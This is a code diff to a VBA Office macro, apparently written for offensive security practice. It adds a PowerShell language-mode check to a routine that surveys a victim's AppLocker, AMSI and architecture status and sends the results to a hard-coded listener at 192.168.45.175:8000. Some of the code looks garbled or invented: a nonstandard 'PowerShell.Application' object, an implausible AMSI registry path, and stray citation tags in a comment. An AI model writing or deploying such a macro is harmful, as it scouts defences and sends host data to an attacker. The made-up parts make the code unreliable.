@@ -22,6 +22,7 @@ Sub CheckSystemStatus()
     Dim applockerStatus As String
     Dim archStatus As String
     Dim amsiStatus As String
+    Dim clmStatus As String
     Dim result As String
     Dim hReq As Object
     
@@ -29,8 +30,10 @@ Sub CheckSystemStatus()
     applockerStatus = CheckAppLockerStatus()
     archStatus = CheckArchitecture()
     amsiStatus = CheckAMSIStatus()
+    clmStatus = GetPowerShellLanguageMode()
+
     ' Combine results
-    result = "AppLocker=" & applockerStatus & "&Architecture=" & archStatus & "&AMSI=" & amsiStatus
+    result = "AppLocker=" & applockerStatus & "&Architecture=" & archStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus
     
     ' Change URL
     strUrl = "http://192.168.45.175:8000/status.txt?" & result
@@ -112,6 +115,7 @@ Function CheckArchitecture() As String
     CheckArchitecture = architecture
 End Function
 
+' Function to get AMSI status
 Function CheckAMSIStatus() As String
     Dim WindowShell As Object
     Dim amsiRegValue
@@ -123,7 +127,6 @@ Function CheckAMSIStatus() As String
     
     On Error Resume Next
     
-    ' Method 1: Check AMSI scanner enablement
     amsiRegValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\FeatureFeatures\BypassAMSI")
     
     If Err.Number = 0 Then
@@ -151,3 +154,39 @@ Function CheckAMSIStatus() As String
     CheckAMSIStatus = status
 End Function
 
+' Function to get CLM
+Function GetPowerShellLanguageMode() As String
+    ' Returns: "FullLanguage", "ConstrainedLanguage", "RestrictedLanguage", "NoLanguage", or "Unknown"
+    
+    Dim ps As Object
+    Dim result As String
+    Dim languageMode As String
+    
+    Set ps = CreateObject("PowerShell.Application")
+    
+    ' Command to get the current language mode returns the current mode [citation:1][citation:2]
+    Dim command As String
+    command = "$ExecutionContext.SessionState.LanguageMode"
+    
+    Dim output As Variant
+    output = ps.Run(command)
+    
+    If IsArray(output) Then
+        If UBound(output) >= 0 Then
+            languageMode = Trim(output(0))
+            
+            ' Validate and return the language mode
+            Select Case languageMode
+                Case "FullLanguage", "ConstrainedLanguage", "RestrictedLanguage", "NoLanguage"
+                    GetPowerShellLanguageMode = languageMode
+                Case Else
+                    GetPowerShellLanguageMode = "Unknown:" & languageMode
+            End Select
+        Else
+            GetPowerShellLanguageMode = "None"
+        End If
+    Else
+        GetPowerShellLanguageMode = "None"
+    End If
+    
+    Exit Function
